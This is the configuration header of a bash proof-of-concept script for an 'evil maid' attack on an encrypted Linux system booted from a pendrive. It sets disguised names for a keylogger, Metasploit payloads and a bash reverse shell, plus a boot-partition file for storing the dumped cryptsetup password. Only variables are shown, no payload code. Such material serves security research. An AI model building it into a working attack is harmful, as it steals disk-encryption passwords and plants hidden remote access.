#!/bin/bash

#these are global options or payload-specific
#Please be aware that this is a proof-of-concept and e.g. determining valid 
#partition should be done in futute.
#However, this PoC works in default instalation which is the most common 
#case and can be manually altered here.

#The assumption is that you are booting the victim from a pendrive,
#you are in your home dir and all the stuff is in "some" directory beneath.
#You should run the script from the outside.

#this is needed for other variables and because of some cd commands
CURRENTWORKINGDIR=`pwd`
#default working dir for script, 
WORKDIR=$CURRENTWORKINGDIR"/kitgen"
#where is located boot partition?
BOOTPARTITION="/dev/sda1"
#where should boot partition be mounted?
MNTDIR="/mnt"

#Payload options, some may be obsolete but for the clarity they are always compiled
#which file on /boot should contain dumped password for cryptsetup?
PASSWORDFILE="memtest86+.config"
#the name of keylogger in victim's system
KEYLOGGER="daemonl"
#the name of metasploit binary payload in victim's system
MSF_PAYLOAD="tcpsd"
#the name of metasploit script payload in victim's system
MSF_PAYLOAD_SHELL="tcpsd.sh"
#the name of script with bash_reverse_shell payload 
BASH_PAYLOAD_SHELL="tcpbd.sh"

